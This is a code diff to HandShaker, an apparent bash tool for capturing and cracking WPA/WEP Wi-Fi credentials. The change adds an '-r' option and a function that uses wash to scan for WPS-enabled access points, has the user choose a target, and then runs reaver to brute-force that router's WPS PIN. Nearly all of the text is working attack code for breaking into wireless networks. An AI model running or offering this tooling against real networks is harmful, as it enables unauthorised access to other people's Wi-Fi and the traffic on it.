@@ -26,6 +26,7 @@ HandShaker - Detect, deauth, capture, crack WPA/2 handshakes and WEP Keys automa
 		-e - Search for AP by partial unique ESSID
 		-l - Scan for APs and present a target list
 		-c - Crack handshake from pcap
+		-r - WPS Cracking with reaver
 		
 	Options:
 		-i  - Wireless Interface card
@@ -218,6 +219,11 @@ pyrit"
 			echo $RED;$COLOR 1;$COLOR2 9;echo " [*] ERROR: $NIC2 card could not be started! "$RST
 			fexit
 		fi
+	fi
+	
+	if [ $DO = 'R' ] 2> /dev/null
+	then
+		freaver
 	fi
 	
 	if [ $GPS = 1 ] 2> /dev/null
@@ -1185,6 +1191,36 @@ fgetgps()
 	URL=' - '$URL
 }
 
+freaver()
+{
+	clear
+	echo $BLU" [*] Scanning for vulnerable WPS APs.."
+	wash -i $MON1 -o wash.log&
+	sleep 15 && killall wash && sleep 1 && clear
+	ESSIDS="$(cat wash.log | grep : | cut -d ' ' -f 59 | sort -u)"
+	echo $GRN" [>] Please choose an AP:"$BLU
+	NUM=0
+	for ESSID in $ESSIDS
+	do
+	NUM=$((NUM + 1))
+	echo " [$NUM] $ESSID"
+	done
+	echo "$ESSIDS" > tmp
+	read -p $GRN"  >" AP
+	AP=$(( AP + 1 ))
+	ESSID=$(cat tmp | sed -n "$AP"p)
+	BSSID=$(cat wash.log | grep $ESSID | cut -d ' ' -f 1)
+	CHAN=$(cat wash.log | grep $ESSID | cut -d ' ' -f 8)
+	if [ $CHAN -z ] 2> /dev/null
+	then
+		CHAN=$(cat wash.log | grep $ESSID | cut -d ' ' -f 7)
+	fi
+	rm wash.log
+	echo $BLU
+	reaver -i $MON1 -c $CHAN -b $BSSID -a -w -v
+	fexit ' '
+}
+
 fexit()																	#Exit
 {
 	killall mdk3 2> /dev/null
@@ -1241,6 +1277,6 @@ ACNT=1
 for ARG in $@
 do
 	ACNT=$((ACNT + 1))
-	case $ARG in "-W")WEP=1;;"-B")BESS=1;;"-d")PACKS=$(echo $@ | cut -d " " -f $ACNT);;"-M")MDK=1;;"-E")EVIL=1;;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-T")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
+	case $ARG in "-r")DO='R';;"-v")VERBOSE=1;;"-W")WEP=1;;"-B")BESS=1;;"-d")PACKS=$(echo $@ | cut -d " " -f $ACNT);;"-M")MDK=1;;"-E")EVIL=1;;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-T")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
 done
 fstart
